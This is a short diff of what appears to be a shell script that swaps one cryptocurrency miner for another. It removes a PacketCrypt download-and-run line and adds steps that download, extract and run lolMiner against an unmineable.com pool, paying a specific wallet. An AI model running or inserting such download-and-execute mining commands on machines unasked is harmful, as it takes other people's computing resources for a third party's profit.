@@ -1,1 +1,4 @@
-wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64 && chmod +x packetcrypt-v0.4.4-linux_amd64 && ./packetcrypt-v0.4.4-linux_amd64 ann -p pkt1q8awnk6zmudzjnrxvlgcpxt7hez774yvmw63lkt http://pool.srizbi.com http://pool.pktpool.io
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz
+tar -xf lolMiner_v1.32a_Lin64.tar.gz
+cd 1.32a
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xbd2839836245eb879c2f4ab88af5b4959537e25a.2#0adr-brof --ethstratum ETHPROXY
